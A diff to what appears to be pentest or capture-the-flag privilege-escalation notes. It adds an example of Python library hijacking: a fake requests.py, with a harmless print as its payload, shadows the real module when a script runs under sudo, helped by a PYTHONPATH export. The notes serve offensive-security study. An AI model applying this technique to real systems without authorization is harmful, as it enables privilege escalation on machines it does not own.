@@ -158,6 +158,22 @@ git log
 git show <id_commit>
 ```
 - If user have permission use sudo on python script, you can check if the script have an import, argument,...
+```python
+#file name example.py
+import requests
+
+requests.get("http://localhost/test")
+```
+```python
+#file name requests.py
+
+def get(a):
+   print("you get hacked")
+```
+Make sure that the requests.py file is in the same directory as your script, or is available in the Python path, so that Python can find it.
+```bash
+export PYTHONPATH=$PYTHONPATH:/path/to/your/module/directory
+```
 - for tansfer script or folder with server/attacker machine :
 ```bash
 # Local network
